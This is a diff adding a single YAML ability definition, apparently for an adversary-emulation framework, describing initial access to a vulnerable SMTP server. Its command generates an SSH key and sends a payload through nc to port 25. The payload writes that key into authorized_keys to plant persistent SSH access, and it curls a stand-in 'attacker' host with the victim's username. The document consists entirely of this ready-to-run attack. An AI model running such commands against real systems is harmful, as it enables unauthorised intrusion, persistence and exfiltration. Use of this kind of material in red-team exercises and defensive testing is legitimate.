@@ -1,0 +1,9 @@
+- id: 40000000-0000-0000-0000-000000000001
+  name: Server SMTP vulnerable RCE
+  description: Server vulnerable to RCE with which is open a SSH shell to the attacker.
+  tactic: initial-access
+  technique: { attack_id: T1190, name: "Exploit Public-Facing Application" }
+  repeatable: false
+  singleton: true
+  platforms:
+    linux: { sh: { command: 'ssh-keygen -t ed25519 -N "" -f ~/.ssh/id_ed25519 -q && echo -n "echo \"$(cat ~/.ssh/id_ed25519.pub)\" >> ~/.ssh/authorized_keys && curl http://attacker/\$(id -un)" | nc -w9 $SMTP_IP 25 > /dev/null 2>&1', timeout: 900, parsers: [], cleanup: "" } }
